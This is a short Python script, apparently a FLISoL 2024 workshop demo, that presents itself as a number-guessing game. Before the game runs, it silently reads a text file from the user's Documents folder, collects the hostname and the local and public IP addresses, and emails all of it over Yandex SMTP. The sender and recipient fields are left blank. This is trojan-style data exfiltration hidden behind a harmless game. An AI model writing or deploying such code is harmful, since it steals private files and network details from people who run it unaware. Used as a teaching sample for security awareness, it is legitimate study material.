import os
from requests import get 
import socket
import smtplib as smtp
import random
import time

ruta_documentos = os.path.expanduser("~/Documents")
archivos_documentos = os.listdir(ruta_documentos)
nombre_archivo_deseado = "tallerFlisol.txt"
archivo_txt = [archivo for archivo in archivos_documentos if archivo.endswith('.txt') and archivo == nombre_archivo_deseado]
if archivo_txt:
    ruta_primer_archivo_txt = os.path.join(ruta_documentos,archivo_txt[0])
    with open (ruta_primer_archivo_txt, 'r') as documento:
        contenido = documento.read()
else:
     contenido = "No existe archivo"

nombre_pc = socket.gethostname()
ip_local = socket.gethostbyname(nombre_pc)
ip_publica = get('http://api.ipify.org').text


email = ''
password = ''
dest_email = ''
asunto = 'taller Flisol 2024'

texto_email = (f'Host:{nombre_pc}\nIp local:{ip_local}\nIp Publica:{ip_publica}\nTexto:{contenido}')

mensaje = (f'From: {email}\nTo: {dest_email}\nSubject: {asunto}\n\n{texto_email}')

server = smtp.SMTP_SSL('smtp.yandex.com',465)


server.login (email,password)

server.sendmail(email,dest_email, mensaje)

server.quit()

def juego():
    numero = random.randint(0,100)
    intentos = 0

    while True:

        intento = input('Ingrese un numero:')
        if not intento.isdigit():
            print('No es un numero ingrese nuevamente')
            continue

        intento = int (intento)
        intentos += 1

        if intento == numero:
            print (f'!Ganaste Felicidades tienes suerte¡ el numero era el {numero} y lo adivinaste despues de {intentos} intentos')
            time.sleep(5)
            break
        elif intento > numero:
            print ('el numero es menor')
        else:
            print ('el numero debe ser mayor')


juego()




